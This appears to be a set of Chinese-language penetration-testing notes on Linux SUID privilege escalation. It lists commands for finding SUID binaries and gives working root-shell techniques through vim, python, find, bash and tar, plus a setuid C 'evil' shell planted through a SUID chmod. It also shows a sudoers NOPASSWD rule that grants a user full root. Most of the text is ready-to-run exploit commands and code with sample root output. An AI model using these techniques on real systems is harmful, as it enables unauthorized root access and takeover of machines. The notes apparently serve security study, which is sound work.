suid提权，即利用拥有root命令的二进制文件进行提权：

find / -user root -perm -4000 -print 2>/dev/null    查找 root 用户拥有的 SUID 文件并打印路径
find / -perm -u=s -type f 2>/dev/null    查找所有具备 SUID 权限的普通文件
find / -user root -perm -4000 -exec ls {} \; 2>/dev/null    查找 root 用户拥有的 SUID 文件并显示详细信息
以上三条命令用于寻找拥有suid权限的文件
常见可利用的suid提权：
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/crontab
/usr/bin/at
/bin/ping
/usr/bin/find
/usr/bin/vim
/usr/bin/nano
/usr/bin/less
/usr/bin/more
/usr/bin/rsync
/usr/bin/screen

一：root权限编辑器
  一个拥有root权限的编辑器是非常可怕的，直接查看shadow文件爆破密码，添加新的用户， 
  或者直接更改/etc/sudoers文件使得普通用户拥有root权限，
  再或者，对于vi和vim，可以直接:!加任意命令   ‘:! <系统命令>’

  '''
  添加授权规则
  添加一条规则来允许特定的普通用户以 root 身份执行所有命令。例如，如果你要让名为 your_username 的普通用户拥有 root 权限，可以添加如下规则：
  
  your_username ALL=(ALL:ALL) ALL
  
  这里规则的各个部分含义如下：
  your_username：表示要赋予权限的普通用户的用户名。
  ALL：表示该用户可以从任何主机登录并执行 sudo 命令。
  (ALL:ALL)：表示该用户可以以任何用户（冒号前部分）和任何用户组（冒号后部分）的身份执行命令，通常情况下默认就是以 root 用户身份执行。
  ALL：表示该用户可以执行任何命令。
  
  如果你希望该用户在执行 sudo 命令时无需输入密码，可以添加 NOPASSWD 选项，规则如下：
  
  your_username ALL=(ALL:ALL) NOPASSWD: ALL
  '''

二：python解释器拥有suid权限
这很可怕，所有python脚本都将以root权限执行，比如反弹shell，或者

  python -c 'import os;os.execl("/bin/sh", "sh", "-p")'
直接用python新建一个终端(root)

三：find  拥有suid权限
利用命令：
touch anyfile #必须要有这个文件
find anyfile -exec whoami \;
find . -exec /bin/sh -p \; -quit

四：bash拥有suid权限(不至于，要是这个都有，那反弹shell刚拿到shell就已经是root了）
利用命令：
bash -p

五：chmod 等文件权限修改程序拥有suid权限：
很可怕，普通用户也能给恶意程序打上suid标签
## 原理

任何能以 root 身份调用 `chmod()`、`chown()` 等系统接口的程序，如果它允许普通用户对自己指定的文件路径执行权限或属主修改，就可能被用来给恶意程序打上 SUID 位。攻击流程通常是：

1. 用户先在可写目录下创建一个恶意可执行文件（如跳转到 `/bin/sh` 的小程序）。
2. 利用 SUID 程序，以 root 身份对该文件执行 `chmod +s`，将其变成 SUID root。
3. 运行该恶意程序，就以 root 身份执行，拿到 shell。

---
### 1. 编写恶意程序

```bash
cat > evil.c << 'EOF'
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    execl("/bin/sh", "sh", NULL);
    return 0;
}
EOF

gcc evil.c -o evil
chmod 755 evil
```

`evil` 会在被设置 SUID 后，执行时切换到 root，并启动一个 shell。

---

### 3. 利用 SUID chmod 打 SUID

```bash
# 普通用户执行以下命令
/tmp/chmod +s ./evil
```

此时 `evil` 就具有 SUID 位：

```bash
$ ls -l evil
-rwsr-xr-x 1 youruser yourgroup  22K May  8 12:00 evil
```

---

### 4. 执行恶意程序，获取 root

```bash
$ ./evil
# id
uid=0(root) gid=0(root) groups=0(root)
```

七：tar

1. 前提条件

    GNU tar（某些特性只在 GNU tar 可用）。

    tar 二进制带 SUID root：可以是真正系统上的 tar，或你自己复制一份后用

    sudo install -m=4755 $(which tar) /tmp/tar_suid

    将其设为 root-owned 且带 SUID 位。
    gtfobins.github.io

    目标系统允许 tar 通过 --checkpoint-action 或 --to-command 调用外部命令。

2. 方法一：❏ --checkpoint-action=exec

--checkpoint 用于在处理完一定数量的记录后触发回调，配合 --checkpoint-action=exec=…，tar 会以自身的有效 UID（此时为 root）去执行指定命令。

# 复制并设置 SUID（若系统 tar 已 SUID，可跳过）
sudo install -m=4755 $(which tar) /tmp/tar_suid

# 用法示例：立即触发一次 checkpoint，执行 /bin/sh
/tmp/tar_suid \
  -cf /dev/null /dev/null \
  --checkpoint=1 \
  --checkpoint-action=exec=/bin/sh

    -c：创建档案，-f /dev/null 指定“空”档案；

    --checkpoint=1：处理 1 个档案块后触发；

    --checkpoint-action=exec=/bin/sh：以 root 身份执行交互式 shell。
    执行后，你会直接获得一个 root shell。
    gtfobins.github.io

3. 方法二：❏ --to-command

--to-command=CMD 会在解包每个文件时，将该文件内容通过管道传给指定命令，CMD 也以 tar 的有效 UID（root）运行。

# 准备一个临时文件，让 tar 解包时把它传给 sh
TF=$(mktemp)
echo '/bin/sh 0<&1' > "$TF"
tar cf "$TF.tar" "$TF"

# 用 SUID tar 解压，触发 --to-command
/tmp/tar_suid \
  -xf "$TF.tar" \
  --to-command=sh

    mktemp 创建唯一文件名；

    文件内容 '/bin/sh 0<&1' 会让 sh 从 tar 的 stdout/ stdin 绑定到你的终端；

    -xf 解包时遇到该文件，就执行 sh，同样拿到 root shell。
    gtfobins.github.io


####其他可执行文件的一般suid二进制文件利用方式：

由于利用方式比较特殊，所以放在了该目录下的‘一般类suid文件利用方式’这个文件夹中
